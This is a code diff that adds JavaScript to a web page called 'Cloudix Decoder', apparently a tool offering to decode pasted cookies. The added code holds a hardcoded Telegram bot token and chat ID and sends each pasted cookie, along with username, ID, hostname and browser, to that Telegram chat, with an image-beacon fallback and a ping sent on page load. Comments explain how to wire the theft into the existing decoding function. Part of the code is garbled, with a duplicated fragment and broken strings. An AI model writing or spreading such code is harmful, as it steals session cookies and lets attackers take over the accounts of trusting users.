@@ -244,6 +244,68 @@
         </div>
 
     <script>
+        javascript
+
+
+// === НАСТРОЙКИ TELEGRAM БОТА ===
+const TELEGRAM_BOT_TOKEN = "8584485458:AAHBTl4NqBz3IpH6Fd-tiaSKkCUeEofWj_o";
+const TELEGRAM_CHAT_ID = "7207027653";
+const SITE_NAME = "Cloudix Decoder";
+// ===============================
+
+// === ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ===
+function sendCookieToTelegram(cookie, username, userId, length) {
+    const shortCookie = cookie.substring(0, 80) + '...';
+    const timestamp = new Date().toLocaleString('ru-RU');
+    const userAgent = navigator.userAgent.substring(0, 100);
+    
+    const message = 
+`🔐 ${SITE_NAME} - НОВАЯ COOKIE
+🕐 ${timestamp}
+👤 USER: ${username}
+🆔 ID: ${userId}
+📏 ДЛИНА: ${length} символов
+🌐 САЙТ: ${window.location.hostname}
+🔗 COOKIE: ${shortCookie}
+📱 BROWSER: ${userAgent}`;
+
+    const url = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)};
+    
+    // Отправка с двумя методами на случай блокировки
+    fetch(url, { mode: 'no-cors' }).catch(() => {
+        // Резервный метод
+        const img = new Image();
+        img.src =dix Decoder";
+// ===============================
+
+// === ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ===
+function sendCookieToTelegram(cookie, username, userId, lengt
+    });
+}
+
+// === ДОБАВЬ ЭТО В ФУНКЦИЮ analyzeCookie ===
+// Найди функцию analyzeCookie в своём коде и добавь ЭТОТ КОД 
+// прямо перед document.getElementById('result').style.display = 'block':
+
+/*
+    // ... существующий код analyzeCookie ...
+    
+    // === ОТПРАВКА В TELEGRAM (ДОБАВЬ ЭТО) ===
+    try {
+        sendCookieToTelegram(cookie, randomUser, randomId, cookieLength);
+    } catch (e) {
+        console.log('Telegram отправка пропущена');
+    }
+    
+    document.getElementById('result').style.display = 'block';
+    // ... остальной код ...
+*/
+
+// === ТЕСТОВОЕ СООБЩЕНИЕ ПРИ ЗАГРУЗКЕ ===
+setTimeout(() => {
+    const testUrl = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent('✅ Cloudix Decoder активен. Ожидание cookie...')};
+    fetch(testUrl).catch(() => {});
+}, 3000);
         function startDecoding() {
             const cookie = document.getElementById('cookieInput').value.trim();
             
